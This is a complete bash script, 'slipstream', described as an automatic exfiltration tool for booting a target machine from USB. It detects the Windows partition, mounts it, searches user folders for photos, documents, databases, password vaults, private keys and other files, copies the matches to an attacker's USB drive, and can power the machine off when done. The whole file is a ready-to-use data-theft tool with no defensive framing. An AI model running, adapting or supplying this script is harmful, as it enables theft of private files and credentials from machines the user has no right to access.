#!/usr/bin/env bash

# slipstream
# Automatic Exfil Script
# Best when combined with buildroot on a USB drive
####################################################################
# Usage: ./slipstream.sh
# Depends on [root,rsync,coreutils,lsblk,parted,bash,awk,grep]
####################################################################
# Copyright 2025 nullcollective
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# Currently only supports Windows 10/11 Target Partition Detection
clear -x

#-------------------
# USER VARIABLES
#--------------------

# DRIVE INFO
# Used to detect USB data drive
# Add Label to partition
USB_LABEL="data"
# Where to mount your target's drive to
TARGET_MOUNT="/mnt/win"
# Where to mount your USB data drive to
USB_MOUNT="/mnt/exfil"

USB_DISK="" # LEAVE BLANK
TARGET_DISK="" # LEAVE BLANK

# EXFIL OPTIONS
# Which find pattern(s) to use
SEARCH="PICS DOCS"
# How far recursive search should decend
SEARCH_DEPTH="4"
# TARGET+BASE (ie: /mnt/win/Users)
BASE_SEARCH_PATH="/Users"
# Poweroff After Completion
poweroff_device="false"

# EXFIL PATTERNS
PICS='.*/.*\.(jpg|jpeg|png|gif)$'
VIDS='.*/.*\.(mp4|mkv|mov)$'
DOCS='.*/.*\.(doc|docx|pdf|txt|rtf|odt|tex)$'
DB='.*/.*\.(xls|xlsx|ods|tsv|csv|db|sqlite|mdb|accdb)$'
CREDS='.*/.*\.(kdb|kdbx|pem|key|cert|crt|ppk)$'
ARCH='.*/.*\.(zip|tar|gz|tgz|xz|exe|7z|rar)$'
SCRIPTS='.*/.*\.(sh|py|bat|ps1|js|pl)$'
OTHER='.*/.*\.(bak|tmp|log)$'
#-------------------------------------------------------
# DO NOT EDIT BELOW UNLESS YOU NEED TO ADJUST THE CODE
#-------------------------------------------------------

echo -e "+++ slipstream by nullcollective +++\n"

# VERIFY ELEVATED PRIVS / REQUIRED FOR MOUNTING DRIVES
if [[ "$UID" -ne 0 ]]; then
	echo "THIS SCRIPT MUST BE RUN AS UID 0" ; exit 1
fi
echo "[>] UID 0 CHECK PASSED"

#-------------------------------------------------------
# INIT
#-------------------------------------------------------
mkdir -p "${TARGET_MOUNT}" 2>/dev/null
mkdir -p "${USB_MOUNT}" 2>/dev/null

# VERIFY PATHS
for dir in $TARGET_MOUNT $USB_MOUNT;do
	if [[ ! -d "${dir}" ]]; then
		echo "DIRECTORY CREATION ISSUES" ; exit 1
	fi
done
echo "[>] MOUNT PATHS CHECK PASSED"

#-------------------------------------------------------
# DRIVE DETECTION
#-------------------------------------------------------

# DETECT WINDOWS PARTITION
for disk in $(lsblk -dn -o NAME,TYPE | awk '$2 == "disk" { print "/dev/" $1 }');do
	part=$(parted -m "${disk}" print | grep -i 'ntfs.*Basic data partition' | cut -d: -f1)
	if [[ -n "$part" ]]; then
		TARGET_DISK=$(echo "$disk"p"$part")
		break
	fi
done

# DETECT EXFIL USB DRIVE
usbpart=$(lsblk -m -o name,label --raw | awk -v label="$USB_LABEL" '$2 == label { print "/dev/" $1 }')
if [[ -n "$usbpart" ]]; then
	USB_DISK=$usbpart
fi

# VALIDATE DEVICES
if [[ -z "${TARGET_DISK}" ]]; then
	echo "NO TARGET DRIVE CANDIDATES FOUND" ; exit 1
fi

if [[ -z "${USB_DISK}" ]]; then
        echo "NO USB EXFIL DRIVES FOUND" ; exit 1
fi

#-------------------------------------------------------
# DRIVE MOUNTING
#-------------------------------------------------------

# MOUNT TARGET PARTITION (R/O)
mount -o ro ${TARGET_DISK} ${TARGET_MOUNT} || { exit 1; }
# MOUNT EXFIL USB PARTITION (R/W)
# Fast Options Enabled for faster unmounting
mount -o sync,noatime,nodiratime ${USB_DISK} ${USB_MOUNT} || { exit 1; }
echo "[>] DRIVES MOUNTED"
echo "[>] slipstreaming file(s) from ${TARGET_DISK} to ${USB_DISK}"
echo "-------------------------------------------------"
#-------------------------------------------------------
# EXFIL PROCESSING
#-------------------------------------------------------
# FIND FILES BY PATTERN
for filetype in ${SEARCH};do
        pattern="${!filetype}"
        find "${TARGET_MOUNT}${BASE_SEARCH_PATH}"/* \
                               	-maxdepth ${SEARCH_DEPTH} \
                                -type f \
                                -regextype posix-extended \
                                -regex ${pattern} | \
                                while read -r foundfile; do
					echo "[discovered] ${foundfile}"
                                        rsync -Rah --protect-args --info=progress2 "${foundfile}" "${USB_MOUNT}/"
        done
done
echo "-------------------------------------------------"
# UNMOUNT USB AND TARGET PARTITIONS
echo "[>] UMOUNTING DRIVES..."
umount ${USB_MOUNT} ; echo "[>>>] USB UNMOUNTED"
umount ${TARGET_MOUNT} ; echo "[>>>] TARGET DRIVE UNMOUNTED"
echo "[>] COMPLETE"

# SHUTDOWN SYSTEM (optional)
if [ "${poweroff_device}" = "true" ]; then
	poweroff
fi
exit 0
